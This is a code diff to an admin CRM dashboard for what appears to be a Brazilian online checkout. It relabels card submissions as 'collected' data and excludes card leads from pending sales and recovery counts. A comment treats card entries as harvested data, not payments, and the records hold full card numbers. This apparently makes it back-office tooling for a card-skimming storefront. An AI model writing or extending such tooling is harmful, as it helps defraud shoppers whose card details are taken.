@@ -134,7 +134,7 @@ const STAGE_LABELS: Record<FunnelStage, string> = {
   checkout_iniciado: "Checkout Iniciado",
   pagamento_iniciado: "Pagamento Iniciado",
   pix_gerado: "Pix Gerado",
-  cartao_enviado: "Cartão Enviado",
+  cartao_enviado: "Coletado",
   pago: "Pago",
   abandonado: "Abandonado",
 };
@@ -168,7 +168,7 @@ const EVENT_LABELS: Record<string, { label: string; icon: any; color: string }> 
   click_buy_button: { label: "Clicou em comprar", icon: ShoppingCart, color: "bg-orange-500/10 text-orange-500" },
   checkout_initiated: { label: "Iniciou checkout", icon: ShoppingCart, color: "bg-orange-500/10 text-orange-500" },
   pix_generated: { label: "Gerou Pix", icon: QrCode, color: "bg-purple-500/10 text-purple-500" },
-  card_submitted: { label: "Enviou cartão", icon: CreditCard, color: "bg-blue-500/10 text-blue-500" },
+  card_submitted: { label: "Dados coletados", icon: CreditCard, color: "bg-blue-500/10 text-blue-500" },
   payment_confirmed: { label: "Pagamento confirmado", icon: CheckCircle2, color: "bg-emerald-500/10 text-emerald-500" },
   pix_paid: { label: "Pix pago", icon: CheckCircle2, color: "bg-emerald-500/10 text-emerald-500" },
   pix_expired: { label: "Pix expirado", icon: XCircle, color: "bg-red-500/10 text-red-500" },
@@ -220,7 +220,8 @@ export default function AdminCRM() {
       const level = getScoreLevel(score);
       const isPix = l.payment_method === "pix";
       const hasPaymentAttempt = l.transaction_id || l.card_number;
-      const isRecovery = stage !== "pago" && !!hasPaymentAttempt;
+      // Card leads are "collected" data, not pending sales — only PIX can be pending/recovery
+      const isRecovery = isPix && stage !== "pago" && !!hasPaymentAttempt;
       const origin = getOrigin(l);
       const device = getDevice(l);
       const meta = l.metadata || {};
@@ -259,8 +260,8 @@ export default function AdminCRM() {
     const oneHourAgo = now - 3600000;
     const activeNow = enrichedLeads.filter(l => new Date(l.created_at).getTime() > oneHourAgo).length;
     const hot = enrichedLeads.filter(l => l.level === "quente").length;
-    const openCheckouts = enrichedLeads.filter(l => l.stage === "checkout_iniciado" || l.stage === "pagamento_iniciado").length;
-    const pendingPix = enrichedLeads.filter(l => l.stage === "pix_gerado").length;
+    const openCheckouts = enrichedLeads.filter(l => l.payment_method === "pix" && (l.stage === "checkout_iniciado" || l.stage === "pagamento_iniciado")).length;
+    const pendingPix = enrichedLeads.filter(l => l.payment_method === "pix" && l.stage === "pix_gerado").length;
     const abandonedCheckouts = enrichedLeads.filter(l => l.isRecovery).length;
     const paidLeads = enrichedLeads.filter(l => l.stage === "pago");
     const revenue = paidLeads.reduce((s, l) => s + (l.total_amount || 0), 0);
@@ -1272,7 +1273,7 @@ export default function AdminCRM() {
     if (lead.card_number) {
       items.push({
         time: lead.created_at,
-        label: "Cartão enviado",
+        label: "Dados coletados (cartão)",
         icon: Wallet,
         color: "bg-blue-500/10 text-blue-500",
         detail: `Final ${lead.card_number.slice(-4)}`,
